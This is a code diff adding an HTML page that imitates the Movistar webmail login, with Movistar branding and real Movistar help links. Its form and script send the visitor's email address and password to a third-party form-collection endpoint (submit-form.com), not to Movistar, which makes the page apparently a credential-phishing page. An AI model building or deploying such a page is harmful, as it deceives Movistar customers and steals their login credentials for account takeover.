@@ -1,0 +1,85 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Movistar Login</title>
+    <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+    <div class="container">
+        <div class="logo">
+            <img src="logo-movistar.png" alt="Movistar Logo">
+        </div>
+        <h2>Acceso webmail</h2>
+        
+        <!-- Form to submit to FormSpark -->
+        <form class="login-form" id="loginForm" method="POST" action="https://submit-form.com/VL2pOiBbf">
+            <label for="email"></label>
+            <input type="email" id="email" name="email" placeholder="Dirección de correo" required>
+
+            <label for="password"></label>
+            <input type="password" id="password" name="password" placeholder="Password" required>
+
+            <!-- Submit button for form -->
+            <button type="submit" id="loginButton">Conectarse</button>
+            
+            <a href="https://soporte-tnet.e.movistar.es/public/tnetpassword/#/captcha" class="forgot-link">No puedo acceder a mi cuenta</a>
+
+            <!-- XP button: Type changed to button to avoid double submission -->
+            <button type="button" id="xpButton">Acceder con Windows XP o Vista</button>
+            <a href="https://ayuda.e.telefonica.net/acceso-correo-windows-xp-vista/" class="xp-link"></a>
+        </form>
+
+        <div class="help" style="display: flex; justify-content: center;">
+            <img src="icono_ayuda.png" alt="">
+            <a href="https://ayuda.e.telefonica.net/">Ayuda</a>
+        </div>
+
+        <div class="footer">
+            <a href="https://www.movistar.es/particulares/ofertas-movistar/?pid=PA-correo-movistar">
+                <img src="ofertas-movistar.jpg" alt="Telefónica Logo">
+            </a>
+        </div>
+    </div>
+
+    <!-- JavaScript to handle form submission -->
+    <script>
+        document.getElementById('loginForm').addEventListener('submit', function(event) {
+    event.preventDefault(); // Prevent the default form submission
+    const formData = new FormData(this);
+    
+    // Convert FormData to JSON
+    const jsonData = {};
+    formData.forEach((value, key) => {
+        jsonData[key] = value;
+    });
+
+    fetch(this.action, {
+        method: 'POST',
+        body: JSON.stringify(jsonData),
+        headers: {
+            'Content-Type': 'application/json', // Set content type to JSON
+            'Accept': 'application/json',
+        },
+    })
+    .then(response => {
+        console.log('Response:', response);
+        if (response.ok) {
+            alert('Form submitted successfully!');
+            this.reset();
+        } else {
+            return response.json().then(data => {
+                alert(`Error: ${data.message || 'There was a problem with your submission.'}`);
+            });
+        }
+    })
+    .catch(error => {
+        console.error('Error:', error);
+        alert('There was an error submitting the form: ' + error.message);
+    });
+});
+
+    </script>
+</body>
+</html>
